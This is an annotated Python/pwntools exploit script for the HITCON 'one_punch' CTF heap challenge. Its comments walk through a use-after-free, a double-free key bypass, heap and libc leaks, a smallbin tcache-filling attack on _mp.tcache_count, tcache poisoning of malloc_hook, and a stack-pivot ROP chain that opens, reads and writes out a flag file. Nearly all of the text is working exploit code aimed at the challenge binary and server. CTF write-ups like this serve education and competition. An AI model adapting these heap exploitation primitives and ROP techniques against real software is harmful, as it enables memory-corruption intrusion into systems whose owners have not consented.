'''
All right, so a super classic ptmalloc CTF pwn, we have an obvious UAF bug:
free does not NULL the stored pointer, so that means we can free any object
any number of times AND we can maintain a writable reference to stale pointers.

With pre libc-2.29, this is super trivial, we can target tcache, get UAFs, tcache
poisoning, done. After libc-2.29 it gets a bit trickier to get around the double
free check, but all that needs is zeroing out the key field, so that's super weak souce.

Okkkay, so what's the challenge then? Why is it called Onepunch?

Well, damn. We suddenly realize that every allocation is with calloc, so we can't actually
target the tcache! But also, every allocation is forced over the fastbin and below the largebin
limit. So no largebin linking attack or fastbin poisoning by default either. Well what then?

And also, what is that secret command?

Ooops, it looks like we actually _can_ do a malloc, but only to the fix 535 size and also only if a
counter is 7 or more. What is this counter?

Well damn. This is pointing to an object that is .... immediately freed by the program? What the hell?

Well.. turns out, ptmalloc is a really sneaky bastard. Guess what, not only is the tcache descriptor struct
stored on the heap, it is not even true that it is stored with the very first allocation of the heap, because
the very first malloc actually triggers the malloc_hook, which initializes malloc_hook to zero AND returns
an allocated chunk... which is to say, it bypasses tcache path. Therefore, tcache is only initialized on the SECOND
allocation, by which time this chunk has already been freed up, and since it is a tcache-less free, the memory
went right back into the top! So the end result was that this funky object is actually OVERLAPPING the tcache
descriptor... and that means that the "magic" value which must be 7+ is actually the index of tcache->counts[]
that corresponds to bin 0x200 which, guessed it, corresponds to the allocation size 535.

So that basically means that we are not able to allocate with malloc UNLESS the tcache bin's count is 7+. However,
due to the default value of the global `_mp.tcache_count` being 7, this means in practice that we should only be able
to have maximum 7 in the heap-based tcache struct's counts array's appropriate index. And that means that we can only
allocate from a tcache bin when it is full. Which is a problem because tcache poisoning needs TWO consecutive allocations.

Also, hey, cool, now we see why the challenge is called "onepunch". Get it? And of course that's a Manga [reference](https://en.wikipedia.org/wiki/One-Punch_Man).
Well HITCON, that's just awesome. I hope the reader will appreciate the exploit name choice as well, courtesy of 2can.

So hold on, let's get back to the challenge solving.

We can't do fastbin poisoning, largebin poisoning, or tcache poisoning, how are we supposed to win exactly?

Cool, now we have an actual challenge! Let's solve it.

Read through all the comments all the way to the end to follow the construction of the exploit. There's
also a discussion at the end about alternative solutions.
'''


'''
First the basics, commands for communicating with the menu of the program that includes the commands:
shome
retire
debut
rename
'''


import os
os.environ['TERM'] = 'xterm-256color'
from pwn import *
import time, struct
context.update(arch='amd64')
context.update(terminal=['tmux', 'splitw', '-h'])

REMOTE = True

gdbscript = [
    # 'b calloc',
    'continue'
]

REMOTE = False

def cmd(cmdIdx):
    p.recvuntil(">")
    p.sendline(str(cmdIdx)) #it is a read(8), but with \n we close it


def leak_heap(idx):
    cmd(3)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))
    print p.recvuntil("hero name: ")
    leak = p.recvuntil("#")
    leak = leak[:len(leak)-2]
    print "leak len is %d" % len(leak)
    leak = leak + "\x00\x00"
    leak = struct.unpack("<Q", leak)[0]
    print "#"
    return leak

def leak_libc(idx):
    cmd(3)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))
    print p.recvuntil("hero name: ")
    leak = p.recvn(6)
    leak = leak + "\x00\x00"
    leak = struct.unpack("<Q", leak)[0]
    print p.recvuntil("#")
    return leak

def show(idx):
    cmd(3)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))
    print p.recvuntil("hero name: ")
    print p.recvuntil("#")

def retire(idx):
    cmd(4)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))

def debut(idx, name):
    cmd(1)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))
    print p.recvuntil("hero name: ")
    p.send(name)

def rename(idx, name):
    cmd(2)
    print p.recvuntil("idx: ")
    p.sendline(str(idx))
    print p.recvuntil("hero name: ")
    p.send(name) #note: use \n to terminate it if len(name) < hero[idx].len

def secret(data):
    cmd(50056)
    p.send(data)
    print p.recvuntil("5. Exit")


if REMOTE == True:
    p = remote('52.198.120.1', 48763)

else:
    p = process('./one_punch', aslr=False)
    gdb.attach(p, gdbscript='\n'.join(gdbscript))


'''
And here comes the actual exploit code.

First, let's get a heap leak. if we retire two chunks, the first will have a tcache fd to the second.
'''

debut(0, (0x100-8)*"A")
debut(1, (0x100-8)*"B")
retire(0)
retire(1)
heap_base = leak_heap(1) - 0x260
print "heap base: 0x%016x" % heap_base

#now we get a libc leak. we can only maintain 3 pointers, but, we can forget our pointers
#and since we allocate with calloc, we never consumer the tcache, only fill it.
#so we can easily fill the tcache for any slot. we select the slot that is necessary for the rest - the secretslot.
#535 is 0x217, that will be 0x220 sized chunks. we request 0x218 so we can write it totally, just in case.
#we need 7 in total, and we need a special reference to 1 of them ,that is not on the edge so that it doesn't get consolidated. so 5+1+1

for i in range(0, 5):
    debut(0, (0x218)*"C")
    retire(0)

#however, we'll need to poison the fd of the first one on the bin (it's LIFO!), so we need a reference maintained to that. so use idx 2 for that.
#actually nevermind we can't do this now!
debut(2, (0x218)*"X")
retire(2)

#now the 7th one, again to 0

debut(0, (0x218)*"C")
retire(0)

#now we do one more - after this it's a candidate for leaking because it goes into unsorted now!
debut(0, (0x218)*"D")

#but first, we must create a fencepost allocation so that freeing it does not consolidate it into the top.
debut(1, 0x100*"F")

#now we can free it and leak libc!

retire(0)
libc_base = leak_libc(0) - (0x00007f057b0faca0- 0x7f057af16000)
print "libc base: 0x%016x" % libc_base
free_hook = libc_base + (0x7fd89ebe65a8 - 0x7fd89e9ff000)
print "free hook address: 0x%016x" % free_hook
system = libc_base + (0x7fd89ea51fd0 - 0x7fd89e9ff000)
print "system address: 0x%016x" % system
malloc_hook = libc_base + 0x1e4c30

#all right, now we have all the leaks, we have the best leaks. tremendous, people are saying these are the best leaks ever.
#we wanted to do tcache poisoning, but the stupid check screws us over.

#ok so we have the leaks, but to recap, we can't have it easy because:
# fastbin sizes are too small, <127 not allowed so we can't allocate to fastbin -> fastbin poisoning out (global_max_fast overwrite could work but if we achieved that we'd have already won anyway here
# largbin sizes start at 1024, so largebin poisoning is out for the same reason
# unsorted bin attack is properly mitigated on 19.04 so that's also out
# we have the custom defence against tcache poisoning (circumventing that is the whole game)
# only thing left is smallbin cache back filling attack, so we try that.


'''
Wait, what is smallbin cache back filling attack? Well that's a valid question, because it hasn't been really
documented in house-of-xyz CTF lore... except that the incomparable 2can has already explained this in the ptmalloc
fanzine years ago, so, really... it's the obvious exploit primitive choice!

See here btw: vhttp://tukan.farm/2017/07/08/tcache/
'''

# Ok, so, let's put together a smallbin cache filling attack that allows us to write that bin address SOMEWHERE. Then we figure out where to write it.


# first of all, we need to get some chunk into the smallbin. we already have a guy in the unsorted bin. if we now make an allocation request for an even bigger size, that guy is going to get moved into the smallbin. so let's do that.

#we must use 1 here, because we need to keep 0 pointing to the original smallbin chunk.

debut(1, (0x400-8)*"u")

# good, 0 landed on the smallbin. now we got to keep 0. so how do we free one more guy here? well, now we can do a double free, oy :)
# but this means we need a reference remaining to one of the guys we freed onto the tcache bin. I think we have a reference to 2, so we should be able to free 2 again, which should actually put it into the unsorted bin? nope, double free detected.

#however, due to the stupid double free protection, we can't *just* free this guy. we have to go and delete the key first. we can do that no problem.
rename(2, p64(0) + p64(0) + 8*"X" + "\n")

#now free it to the unsorted bin!
retire(2)

#now again alloc too large -> we get 2 on the smallbin!
debut(1, (0x400-8)*"u")

#now there is supposed to be 2 chunks in smallbin, and we are supposed to have pointers to both of them

#from here the smallbin tcache attack should work, giving us the win by releasing the tcache custom "lock"

#so the idea is to have exactly 1 slot in the tcache -> we get this by doing one secret allocation right now

secret("A"*535)

#and now we prime the smallbin attack by overwriting 0's fd and bk
#the chunk->bck->fd = bin write is our target. so if we want to write to X, we have to use the address X-0x20
#however, we must be very careful -> the fd must remain valid! so we have to write back here the correct value.
#since the smallbin cache filling goes BACKWARDS, the one we have to corrupt is 2 not 0!

#valid_fd = heap_base + (0x5557c0eceef0 - 0x5557c0ec9000 - 0x5000) #wtf i can't math
valid_fd = (0x55a65a39c330 - 0x55a65a39b000) + heap_base
#p.interactive()

'''
Cool! Now all we need is the proper choice for `smallbin_corruption_target_addr` here.

At this point, I'll confess that I went off on a huuuuuge tangent. I came up with some targets,
that aren't viable, or are viable but through some really heavy lifting. In the end, my fantastic
teammate 2can brought attention to the obvious target and we got the flag from there rather quickly.
Of course, I could tell you all about the alternative direction I came up with... but I don't want to spoil
future CTF challenges. So let's leave that out for now :)

Because, OF COURSE, the right choice is corrupting... `_mp.tcache_count` ITSELF.

Since, if that becomes > 7, then we can simply free more chunks onto the tcache bin, which means that malloc can
be called multiple times before we reach 6. So that gives us the tcache poisoning we wanted and the win, keeping
in mind that the challenge runs under a seccomp filter that ruins system() calls, so instead we had to reapply
the same rop chain with a stack lift gadget that was developed for [LazyHouse](https://gist.github.com/andigena/4628eae54ad185107fd3ca91fc6a92a3).

So how about the stack lift gadget? Well, we could target a free hook and use an rdi/rsp exchange gadget.. but even easier, we can use
a stack lift gadget in the literal sense, like `add rsp, 0x48 ; ret`. This is because, conveniently, the debut
function always reads the input first into a stack buffer and then allocates and copies it to the alloced buffer. That's cool because,
this way we'll have control over stack contents. Lovely.
'''


#so this is _mp.tcache_count`
smallbin_corruption_target_addr = libc_base + 0x1e42e0
rename(2, p64(valid_fd) + p64(smallbin_corruption_target_addr - 0x10) + "\n")
#rename(2, p64(valid_fd) + p64(heap_base+0x10+0x20-0x10) + "\n")

#now we have to trigger actually this smallbin tcache-ing. well, we need an exact size allocation request! we no longer need 2 so let's use it

debut(2, (0x218)*"D")

#now we can allocate many many chunks from tcache. We no longer need 0, so let's replace it with what will be the container for the path string that the rop chain uses.

debut(0, "/home/lazyhouse/flag\0".ljust(0x400-1))
# pause()


#Now we get another guy freed up and put on the tcache

secret(cyclic(25))
retire(2)

#Now we'll Double Free it, by corrupting the key this won't be detected.

rename(2, 'A'*8 + 'B'*8)
retire(2)

#Now we modify it's fd to point instead of itself to malloc_hook

rename(2, p64(malloc_hook-8) + cyclic(24))
retire(2)
rename(2, p64(malloc_hook-8) + cyclic(16))

#Now we allocate one guy, this primes the tcache poisoning

pivot = libc_base + 0x000000000008cfd6 # add rsp, 0x48 ; ret
print 'pivot: ', hex(pivot)
secret(p64(pivot) + p64(pivot) + p64(pivot))

#And finally we trigger the tcache poison, giving us the address over the malloc_hook, and use the content to overwrite it.
secret(p64(pivot) + p64(pivot) + p64(pivot))
# secret(cyclic(25))
# secret(cyclic(25))

'''
Now let's put the rop chain together... because the next allocation request will trigger malloc_hook with our desired
chain actually on the stack, just at a wrong offset. But since we invoke `add rsp, 0x48 ; ret` as the malloc hook, everything
comes together.

Lovely!
'''

flag_path_addr = heap_base + 0x1e70
print '0x55555555ae70, flag_path_addr: ', hex(flag_path_addr)

pop_rdi = libc_base + 0x0000000000026542  # pop rdi ; ret
pop_rsi = libc_base + 0x0000000000026f9e # pop rsi ; ret
pop_rdx = libc_base + 0x000000000012bda6 # pop rdx ; ret
pop_rcx = libc_base + 0x000000000010b31e # pop rcx ; ret
pop_rax = libc_base + 0x0000000000047cf8 # pop rax ; ret
ret = libc_base + 0x000000000002535f # ret
syscall_ret = libc_base + 0x00000000000cf6c5 # syscall ; ret
### for dev/debugging
# debut(0, '/home/lazyhouse/flag\0'.ljust(0x200))
print 'set *(size_t*)&__malloc_hook={}'.format(hex(pivot))
###

chain = flat([
    ret,
    ret,
    ret,
    pop_rax,
    2,  # open
    pop_rdi,
    flag_path_addr,
    pop_rsi,
    constants.O_RDONLY,
    syscall_ret,    # open

    pop_rax,
    0,  # read
    pop_rdi,
    3,
    pop_rsi,
    flag_path_addr,
    pop_rdx,
    0x100,
    syscall_ret,

    pop_rax,
    1,  # write
    pop_rdi,
    1,
    pop_rsi,
    flag_path_addr,
    pop_rdx,
    0x100,
    syscall_ret,
])


debut(0, chain.ljust(0x200))
p.interactive()

'''
And finally, we get the flag written out to us:
hitcon{y0u_f0rg0t_h0u23_0f_10r3_0r_4fra1d_1ar93_b1n_4tt4ck}

.... okay. Well, given the flag of LazyHouse, we highly suspect
that the challenge creators _thought_ that we will solve LazyHouse
with this attack, and we will not realize tcache reenablement here
and use a different vector. Namely, that we do a largebin attack
to hit global_max_fast for fastbin poisoning reenablement (we are guessing).

So as a collorary, it is worth mentioning that yes, even though we can't
do largebin sized allocations, it is not actually true we couldn't do
largebin attack here - as I realized as soon as we got the flag and it got
me thinking. Since, that only needs a smartly corrupted largebin-sized chunk to be on the heap's
unsorted bin when an allocation request happens; if that request will be to a
different size, this chunk can then go into a largebin, then this corrupt chunk
will trigger the known largebin attack.

And, I guess the trick is, we can free a non-largebin unto unsorted and then using
chunk overlapping that I didn't describe here but is very much possible and we
did achieve actually (alloc obj0 0x400, free back to unsorted to top, then alloc
obj1/obj2 smaller sizes, to overlap with the stale obj0 pointer), we can actually manipulate
a fake largebin-sized chunk into triggering the attack.

Maybe that's what the author had in mind. To be honest, I'm not sure what he
was driving at with house of lore. Yes that's possible for smallbins, but it needs
a target where the +8 (bk) is properly controlled; one could think of the bins themselves
but the size field wouldn't be correct there which I think gets in the way. Although I'm
not sure. Anyway, I'm sure there's some team somewhere that somehow went the 
"y0u_f0rg0t_h0u23_0f_10r3" route, whatever it means, so go out there on the Internet and find it! :)
'''

